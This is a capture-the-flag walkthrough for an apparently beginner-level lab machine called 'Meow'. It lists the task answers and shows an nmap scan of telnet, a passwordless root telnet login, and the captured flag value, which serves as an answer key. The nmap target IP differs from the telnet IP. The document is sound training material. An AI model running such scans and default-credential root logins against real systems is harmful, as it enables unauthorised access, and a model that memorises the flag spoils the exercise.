# Target Info
Target Machine IP = 10.129.23.206

# Solution
1. Virtual Machine
2. terminal
3. openvpn
4. tun
5. ping
6. nmap
7. run nmap scan abd get tge service in port 23, telnet
```
○ nmap -p 23 10.129.23.206 -Pn
Starting Nmap 7.80 ( https://nmap.org ) at 2023-05-21 03:47 WIB
Nmap scan report for 10.129.23.206
Host is up.

PORT   STATE    SERVICE
23/tcp filtered telnet

Nmap done: 1 IP address (1 host up) scanned in 18.54 seconds
```
8. root
9. run telnet to remote machine on port 23
```
zeta at melforger in ~
○ telnet 10.129.112.97 -l root
Trying 10.129.112.97...
Connected to 10.129.112.97.
Escape character is '^]'.
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 21 May 2023 04:06:41 AM UTC

  System load:           0.15
  Usage of /:            41.7% of 7.75GB
  Memory usage:          4%
  Swap usage:            0%
  Processes:             143
  Users logged in:       0
  IPv4 address for eth0: 10.129.112.97
  IPv6 address for eth0: dead:beef::250:56ff:feb9:d10b

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

75 updates can be applied immediately.
31 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sun May 21 04:06:15 UTC 2023 on pts/0
root@Meow:~# ls
flag.txt  snap
root@Meow:~# cat flag.txt
b40abdfe23665f766f9c61ecba8a4c19
root@Meow:~#
```
flag = b40abdfe23665f766f9c61ecba8a4c19
